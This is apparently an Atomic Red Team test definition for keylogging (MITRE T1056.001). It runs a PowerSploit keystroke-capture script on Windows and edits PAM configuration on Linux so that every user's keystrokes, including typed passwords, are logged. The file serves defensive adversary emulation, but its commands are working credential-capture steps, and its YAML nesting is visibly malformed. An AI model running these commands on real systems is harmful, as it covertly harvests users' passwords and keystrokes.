attack_technique: T1056.001
display_name: 'Input Capture: Keylogging'
atomic_tests:
- name: Input Capture
  auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
  description: |
    Utilize PowerShell and external resource to capture keystrokes
    [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
    Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

    Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
  supported_platforms:
  - windows
  input_arguments:
    filepath:
      description: Name of the local file, include path.
      type: Path
      default: $env:TEMP\key.log
  executor:
    command: |
      Set-Location $PathToAtomicsFolder
      .\T1056.001\src\Get-Keystrokes.ps1 -LogPath #{filepath}
    cleanup_command: |
      Remove-Item $env:TEMP\key.log -ErrorAction Ignore
    name: powershell
    elevation_required: true
    - name: Living off the land Terminal Input Capture on Linux with pam.d
  description: |
    Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  

    Passwords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).
   
    Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. 
  prereq_command: |
    if [-f /usr/lib/pam/pam_tty_audit.so ]; then exit 0; else exit 1; fi
  supported_platforms:
  - linux
  executor:
    command: |
      if [ -f /etc/pam.d/password-auth ]; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
      if [ -f /etc/pam.d/system-auth ]; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
      sudo touch /tmp/password-auth.bk
      sudo touch /tmp/system-auth.bk
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
      sudo pam-auth-update --package --force
    cleanup_command: |
      sudo mv /tmp/password-auth.bk /etc/pam.d/password-auth
      sudo mv /tmp/system-auth.bk /etc/pam.d/system-auth
    name: bash
    elevation_required: true
        - name: Living off the land Terminal Input Capture on Linux with pam.d for shell
  description: |
    This is the same as test 2, only without the bashisms:  Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  

    Passwords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).
   
    Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. 
  prereq_command: |
    if test -f /usr/lib/pam/pam_tty_audit.so; then exit 0; else exit 1; fi
  supported_platforms:
  - linux
  executor:
    command:
      if test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
      if test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
      sudo touch /tmp/password-auth.bk
      sudo touch /tmp/system-auth.bk
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth
      sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
      sudo pam-auth-update --package --force
    cleanup_command: |
      sudo mv /tmp/password-auth.bk /etc/pam.d/password-auth
      sudo mv /tmp/system-auth.bk /etc/pam.d/system-auth
    name: sh
    elevation_required: true
